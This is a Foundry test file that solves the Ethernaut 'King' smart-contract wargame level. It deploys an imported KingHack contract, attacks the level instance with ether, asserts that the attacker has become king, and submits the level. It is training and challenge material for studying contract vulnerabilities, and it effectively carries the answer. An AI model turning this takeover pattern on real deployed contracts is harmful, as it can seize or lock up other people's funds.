// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/King/KingFactory.sol";
import "../src/King/KingHack.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract KingTest -vvvv
contract KingTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testKingHack() public {
        /****************
         * Factory setup *
         *************** */
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            kingFactory
        );
        King ethernautKing = King(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        KingHack kingHack = new KingHack(payable(levelAddress));
        address initialKing = ethernautKing._king();
        /**In the hack contract, in attack function, we need to pass a msg.value
         *calling the receive of the base contract
         * In order to claim ownership, we either need a value >= prize or be the owner
         * When calling the attack function you should see a log with a reverted transaction
         * It's normal because of the way the initial contract is designed
         * Once the fallback is called and condition met, the actual king transfer back the msg.value to the msg.sender
         */
        kingHack.attack{value: 1 ether}();
        address afterKing = ethernautKing._king();
        assertTrue(initialKing != afterKing);
        assertEq(address(kingHack), afterKing);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
